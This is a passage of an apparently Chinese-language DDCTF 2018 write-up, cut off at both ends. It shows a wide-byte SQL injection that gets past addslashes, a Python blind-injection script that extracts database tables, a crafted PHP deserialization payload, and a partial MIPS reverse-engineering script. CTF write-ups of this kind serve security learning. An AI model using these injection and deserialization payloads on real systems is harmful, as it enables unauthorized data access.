class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</div><div class="line">			<span class="keyword">int</span> pos = i * <span class="number">2</span>;</div><div class="line">			d[i] = (<span class="keyword">byte</span>) (charToByte(hexChars[pos]) &lt;&lt; <span class="number">4</span> | charToByte(hexChars[pos + <span class="number">1</span>]));</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> d;</div><div class="line">	&#125;</div><div class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">charToByte</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">byte</span>) <span class="string">"0123456789ABCDEF"</span>.indexOf(c);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>得到输出<code>44444354467B333631343538353036323532393832353737337D</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="string">"44444354467B333631343538353036323532393832353737337D"</span>.decode(<span class="string">"hex"</span>)</div><div class="line">DDCTF&#123;<span class="number">3614585062529825773</span>&#125;</div></pre></td></tr></table></figure></p>
<p>这一题比较的脑洞，也比较考验jsp这边的经验，也难怪卡了这么久</p>
<h4 id="Web3-注入的奥妙"><a href="#Web3-注入的奥妙" class="headerlink" title="Web3 - 注入的奥妙"></a>Web3 - 注入的奥妙</h4><p>题目提示得很明显，Sql注入<br>然后进去就是一个标准的注入套路，还有注入回显</p>
<img src="/2018/04/21/又是一年DDCTF/11-44-20.jpg" alt="11-44-20.jpg" title="">
<p>url是这种<code>http://116.85.48.105:5033/05069d93-1384-4097-a7e7-047658cacbfa/well/getmessage/1</code>，应该是经过重写的一个参数传递方式<br>测试了几个常规的payload，发现应该是用<code>addslashes</code>等函数过滤的，特殊字符加了反斜杠转义<br>由于页面提示得那么明显，我们直接尝试宽字节注入<br>这个网址挺不错的，可以将十六进制数直接变成各个编码对应的字<br><a href="http://www.qqxiuzi.cn/bianma/zifuji.php" target="_blank" rel="external">http://www.qqxiuzi.cn/bianma/zifuji.php</a></p>
<p>我们随便选几个会出现宽字节注入的编码(GBK2312不行，因为它低字节没有<code>5C</code>)<br><img src="/2018/04/21/又是一年DDCTF/12-26-22.jpg" alt="12-26-22.jpg" title=""><br>测试到BIG5编码（没做这题之前并不知道这个编码）</p>
<img src="/2018/04/21/又是一年DDCTF/12-27-55.jpg" alt="12-27-55.jpg" title="">
<p>然后测试这样的<code>payload</code>——<code>綅&#39;or%201%23</code></p>
<img src="/2018/04/21/又是一年DDCTF/12-30-36.jpg" alt="12-30-36.jpg" title="">
<p>发现成功转义了反斜杠，逃逸出了单引号<br>稍后我们再结合源码解释一下为什么会出现这样的效果<br>毕竟写文章是为了总结，不仅仅是为了记录姿势是吧(大佬们可以跳过此环节)<br>然后我们就可以进行常规的注入了<br>我直接拿来Web1的盲注脚本直接用了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests,urllib</div><div class="line">url = <span class="string">'http://116.85.48.105:5033/05069d93-1384-4097-a7e7-047658cacbfa/well/getmessage/1'</span></div><div class="line">hea = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"</span>,</div><div class="line">       <span class="string">"X-forwarded-for"</span>: <span class="string">"123.232.23.245"</span>&#125;</div><div class="line">payload = <span class="string">"綅'and ord(mid((select schema_name from information_schema.schemata limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125;#"</span></div><div class="line"><span class="comment">#information_schema,sqli 0x73716c69</span></div><div class="line"></div><div class="line"><span class="comment"># payload = "綅'and ord(mid((select table_name from information_schema.tables where table_schema lilikeke 0x73716c69 limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125;#"</span></div><div class="line"><span class="comment">#route_rules 0x726f7574655f72756c6573,message 0x6d657373616765</span></div><div class="line"><span class="comment"># id,pattern,action,rulepass</span></div><div class="line"><span class="comment"># payload = "綅'and ord(mid((select column_name from information_schema.columns where table_name lilikeke 0x6d657373616765 limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125; #"</span></div><div class="line"><span class="comment">#contents,id,name</span></div><div class="line">l = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">64</span>]</div><div class="line">str1 = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">    str1 = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</div><div class="line">        n = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> l:</div><div class="line">            payload = <span class="string">"綅'and ord(mid((select group_concat(rulepass) from sqli.route_rules limit &#123;&#125;,1),&#123;&#125;,1))&amp;&#123;&#125;#"</span></div><div class="line">            result = requests.get(url + urllib.quote(payload.format(t, j, i))).text</div><div class="line">                        <span class="comment"># print result</span></div><div class="line">            <span class="keyword">if</span> <span class="string">"test1"</span> <span class="keyword">in</span> result:</div><div class="line">                n += i</div><div class="line"></div><div class="line">        length = len(str1)</div><div class="line">        str1 += chr(n) <span class="keyword">if</span> n!=<span class="number">0</span> <span class="keyword">else</span> <span class="string">""</span></div><div class="line">        <span class="keyword">print</span> str1</div><div class="line">        <span class="keyword">if</span> length ==len(str1):</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>得到<code>sqli.route_rules</code>表的所有信息如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">id</div><div class="line">1,12,13,15</div><div class="line"></div><div class="line">rulepass</div><div class="line">cd4229e671a8830debfcbb049a23399c,5ed16f9c7c27cb846eaf15c19fe40093,3228ad498d5a20d1d22d6a4a15fed4d2</div><div class="line"></div><div class="line">action</div><div class="line">Well#getmessage,JustTry#self , JustTry#try , static/bootstrap/css/backup.zip</div><div class="line"></div><div class="line">pattern</div><div class="line">get*/	u/well/getmessage/ 	s</div><div class="line">get*/	u/justtry/self/ 	s</div><div class="line">post*/	u/justtry/try 	2</div></pre></td></tr></table></figure></p>
<p>于是我们直接下载到了源码备份<code>static/bootstrap/css/backup.zip</code><br>注意到<code>Test</code>类<br><img src="/2018/04/21/又是一年DDCTF/14-52-38.jpg" alt="14-52-38.jpg" title=""><br><img src="/2018/04/21/又是一年DDCTF/14-53-09.jpg" alt="14-53-09.jpg" title=""><br>以及<code>Justtry</code>类的<code>try</code>方法</p>
<img src="/2018/04/21/又是一年DDCTF/14-54-39.jpg" alt="14-54-39.jpg" title="">
<p>看得出来出题人偷懒了，直接给了我们一个提示，我们只需要构造好序列化字符串给<code>try</code>函数启动<code>Test</code>类的析构函数就能得到<code>flag</code>了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $user_uuid;</div><div class="line">    <span class="keyword">public</span> $fl;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'hhkjjhkhjkhjkhkjhkhkhk'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;getflag(<span class="string">'ctfuser'</span>, <span class="keyword">$this</span>-&gt;user_uuid);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setflag</span><span class="params">($m = <span class="string">'ctfuser'</span>, $u = <span class="string">'default'</span>, $o = <span class="string">'default'</span>)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $user = <span class="keyword">array</span>(</div><div class="line">            <span class="string">'name'</span> =&gt; $m,</div><div class="line">            <span class="string">'oldid'</span> =&gt; $o,</div><div class="line">            <span class="string">'id'</span> =&gt; $u</div><div class="line">        );</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;fl-&gt;set($user, <span class="number">2</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $sql;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$testzero = <span class="keyword">new</span> Test();</div><div class="line">$testzero-&gt;user_uuid=<span class="string">"05069d93-1384-4097-a7e7-047658cacbfa"</span>;</div><div class="line">$testzero-&gt;fl=<span class="keyword">new</span> Flag();</div><div class="line">$testzero-&gt;fl-&gt;sql = <span class="keyword">new</span> SQL();</div><div class="line">$serialize = serialize($testzero);</div><div class="line"><span class="keyword">echo</span> $serialize;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>然后我们将序列化之后的字符串<code>POST</code>给<code>/justtry/try</code>目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hhkjjhkhjkhjkhkjhkhkhkO:4:&quot;Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;05069d93-1384-4097-a7e7-047658cacbfa&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure></p>
<p>恩，发现是没反应的</p>
<img src="/2018/04/21/又是一年DDCTF/17-48-08.jpg" alt="17-48-08.jpg" title="">
<p>于是我再次卡了挺久，经师傅提醒才发现，类名需要带上路径，一口老血<br>修改成这个样子就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:17:&quot;Index\Helper\Test&quot;:2:&#123;s:9:&quot;user_uuid&quot;;s:36:&quot;05069d93-1384-4097-a7e7-047658cacbfa&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:&#123;s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:&#123;&#125;&#125;&#125;</div></pre></td></tr></table></figure></p>
<p>成功获取flag</p>
<img src="/2018/04/21/又是一年DDCTF/17-50-01.jpg" alt="17-50-01.jpg" title="">
<p>宽字节注入漏洞原理 <a href="#">看这篇文章</a></p>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h4 id="逆向1-MIPS"><a href="#逆向1-MIPS" class="headerlink" title="逆向1 - MIPS"></a>逆向1 - MIPS</h4><p>这题是我在web没思路期间做的，比较坑人,而且自己的姿势也不够多，导致用了笨方法，消耗了很多时间<br>题目是一个mips的elf文件，逻辑主要输你输入16个值，然后经过检验之后你输入的值就是flag，然后帮你输出<br>在ubuntu下装qemu折腾了好久才运行起来，但是无论你输入啥都会段错误<br>那肯定是加了花，但是一般加花程序也能运行，只是混淆了反编译器的反编译代码，但是这次的花把自己给加到段错误不能运行了，我是很服气的，导致我纠结了很久是不是类似于栈溢出跳转到别的地方执行之类的骚套路。事实证明他只是加花把自己加死了= =<br>先分析一下这个花</p>
<img src="/2018/04/21/又是一年DDCTF/20-50-39.jpg" alt="20-50-39.jpg" title="">
<p>在程序检验flag的流程里，出现了这种无法指执行的指令如<code>jalx    0xDAC0BAC</code>、<code>sh      $sp, 0x2EB($t7)</code>、甚至是不是指令的垃圾数据<code>.word 0x54F102EB</code><br>但是他们都有一个共同点，就是将指令变成数据之后，他们的较低位的两字节都是<code>02EB</code></p>
<img src="/2018/04/21/又是一年DDCTF/20-54-20.jpg" alt="20-54-20.jpg" title="">
<p>所以这题的预期解法应该是把这些较低字节为<code>02EB</code>的垃圾数据清除后再运行程序，就会很清楚地看到16个检验循环，进而得到16个等式构成一个方程组解出16个变量，即flag<br>而我就比较<del>牛逼</del>了<br>由于缺乏这种去花常识，我直接用python解析ida的代码，用自己的逻辑跳过垃圾指令，从而自己得出方程（这就是一个笨方法）<br>首先将存进栈内的256个检验变量计算出来，所以我们将IDA反汇编的代码从地址<code>0x40042C</code>到<code>0x40187C</code>复制出来放到<code>load.txt</code>，然后将地址<code>0x401880</code>到<code>0x403210</code>的代码放到<code>loop.txt</code>中，然后运行这个python脚本就好了.<br>switch=1分析load，等于0则分析loop</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">fp = [<span class="number">0</span>] * <span class="number">256</span></div><div class="line">instructionList = [<span class="string">"lui"</span>, <span class="string">"sra"</span>, <span class="string">"li"</span>, <span class="string">"sw"</span>, <span class="string">"lw"</span>, <span class="string">"xori"</span>, <span class="string">"ori"</span>, <span class="string">"sll"</span>, <span class="string">"negu"</span>, <span class="string">"mul"</span>, <span class="string">'addu'</span>, <span class="string">'subu'</span>, <span class="string">'beq'</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sra</span><span class="params">(v0, offset)</span>:</span></div><div class="line">    t = <span class="number">0</span></div><div class="line">    num2bytes = bin(v0)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</div><div class="line">    <span class="keyword">while</span> t &lt; offset:</div><div class="line">        n = (<span class="number">0x80000000</span> <span class="keyword">if</span> num2bytes[<span class="number">0</span>] == <span class="string">'1'</span> <span class="keyword">else</span> <span class="number">0</span>)</div><div class="line">        v0 = ((v0 &gt;&gt; <span class="number">1</span>) | n)</div><div class="line">        t += <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> v0</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">li</span><span class="params">(v0, immidiateNum)</span>:</span></div><div class="line">    <span class="keyword">if</span> isinstance(immidiateNum, str):</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x'</span> <span class="keyword">in</span> immidiateNum:</div><div class="line">            immidiateNum = int(immidiateNum, <span class="number">16</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            immidiateNum = int(immidiateNum)</div><div class="line">    <span class="keyword">return</span> immidiateNum</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">lui</span><span class="params">(v0, immidiateNum)</span>:</span></div><div class="line">    <span class="keyword">return</span> immidiateNum &lt;&lt; <span class="number">16</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sll</span><span class="params">(v0, offset)</span>:</span></div><div class="line">    <span class="keyword">return</span> (v0 &lt;&lt; offset) &amp; <span class="number">0xffffffff</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(v0, v1)</span>:</span></div><div class="line">    <span class="keyword">return</span> (v0 ^ v1) &amp; <span class="number">0xffffffff</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ori</span><span class="params">(v0, v1)</span>:</span></div><div class="line">    <span class="keyword">return</span> (v0 | v1) &amp; <span class="number">0xffffffff</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">negu</span><span class="params">(v0)</span>:</span></div><div class="line">    num2bytes = bin(v0)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</div><div class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">"0"</span> <span class="keyword">if</span> x == <span class="string">"1"</span> <span class="keyword">else</span> <span class="string">"1"</span>, num2bytes)), <span class="number">2</span>) + <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sw</span><span class="params">(v0, offset)</span>:</span></div><div class="line">    <span class="keyword">if</span> isinstance(offset, str):</div><div class="line">        offset = int(offset, <span class="number">16</span>)</div><div class="line">    fp[offset / <span class="number">4</span> - <span class="number">2</span>] = v0</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">lw</span><span class="params">(v0, offset)</span>:</span></div><div class="line">    <span class="keyword">return</span> fp[offset / <span class="number">4</span> - <span class="number">2</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addiu</span><span class="params">(v0, v1)</span>:</span></div><div class="line">    <span class="keyword">return</span> (v0 + v1) &amp; <span class="number">0xffffffff</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">subu</span><span class="params">(v0, v1)</span>:</span></div><div class="line">    <span class="keyword">return</span> (v0 - v1) &amp; <span class="number">0xffffffff</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(v0, v1)</span>:</span></div><div class="line">    <span class="keyword">return</span> (v0 * v1) &amp; <span class="number">0xffffffff</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">numeric</span><span class="params">(immidiateNum)</span>:</span></div><div class="line">    <span class="keyword">if</span> isinstance(immidiateNum, str):</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x'</span> <span class="keyword">in</span> immidiateNum:</div><div class="line">            immidiateNum = int(immidiateNum, <span class="number">16</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            immidiateNum = int(immidiateNum)</div><div class="line">    <span class="keyword">return</span> immidiateNum</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">isInstruction</span><span class="params">(line)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">if</span> len(line) &lt; <span class="number">20</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        instruction = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?([^\s]+?)\s+"</span>, line)[<span class="number">0</span>]</div><div class="line">        <span class="keyword">if</span> instruction <span class="keyword">not</span> <span class="keyword">in</span> instructionList:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> <span class="string">"Some wrongs occured:"</span>, e</div><div class="line">        <span class="keyword">print</span> <span class="string">"The line is:"</span>, line,</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">v0 = <span class="number">0</span></div><div class="line">v1 = <span class="number">0</span></div><div class="line">a0 = <span class="number">0</span></div><div class="line"></div><div class="line">switch = <span class="number">1</span></div><div class="line"><span class="keyword">if</span> switch:</div><div class="line">    f = open(<span class="string">r"C:\Users\windows8.Windows\Desktop\load_r.txt"</span>, <span class="string">"r+"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    f = open(<span class="string">r"C:\Users\windows8.Windows\Desktop\loop_r.txt"</span>, <span class="string">"r+"</span>)</div><div class="line">lines = f.readlines()</div><div class="line">globalV = locals()</div><div class="line"><span class="keyword">if</span> switch:</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">        <span class="keyword">if</span> isInstruction(line):</div><div class="line">            ins = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?([^\s]+?)\s+"</span>, line)[<span class="number">0</span>]</div><div class="line">            rd = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$(.+?),"</span>, line)[<span class="number">0</span>]</div><div class="line">            <span class="keyword">if</span> rd <span class="keyword">not</span> <span class="keyword">in</span> globalV:</div><div class="line">                <span class="keyword">print</span> <span class="string">"Not expect rd:"</span>, line,</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> ins == <span class="string">"li"</span>:</div><div class="line">                imint = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                globalV[rd] = li(globalV[rd], numeric(imint))</div><div class="line"></div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"lui"</span>:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    imint = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                    globalV[rd] = lui(globalV[rd] <span class="keyword">if</span> globalV[rd] <span class="keyword">else</span> <span class="number">0</span>, numeric(imint))</div><div class="line">                <span class="keyword">except</span> Exception, e:</div><div class="line">                    <span class="keyword">print</span> <span class="string">"Can't not lui:"</span>, line, <span class="string">"Reason:"</span>, e, <span class="string">"."</span></div><div class="line"></div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"sw"</span> <span class="keyword">and</span> <span class="string">"($fp)"</span> <span class="keyword">in</span> line:</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                <span class="keyword">except</span> Exception, e:</div><div class="line">                    <span class="keyword">print</span> <span class="string">"Exception:"</span>, e, line,</div><div class="line">                    <span class="keyword">continue</span></div><div class="line">                <span class="keyword">if</span> offset == <span class="string">"0x410"</span>:</div><div class="line">                    <span class="keyword">continue</span></div><div class="line">                sw(globalV[rd], numeric(offset))</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"lw"</span>:</div><div class="line">                offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    <span class="keyword">if</span> offset == <span class="string">"0x410"</span>:</div><div class="line">                        <span class="keyword">continue</span></div><div class="line">                    globalV[rd] = lw(globalV[rd], numeric(offset))</div><div class="line">                <span class="keyword">except</span> Exception, e:</div><div class="line">                    <span class="keyword">print</span> line, e</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"xori"</span>:</div><div class="line">                offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                globalV[rd] = xor(globalV[rd], numeric(offset))</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"xor"</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">"Attention:"</span>, line,</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"ori"</span>:</div><div class="line">                offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                globalV[rd] = xor(globalV[rd], numeric(offset))</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">'addi'</span> <span 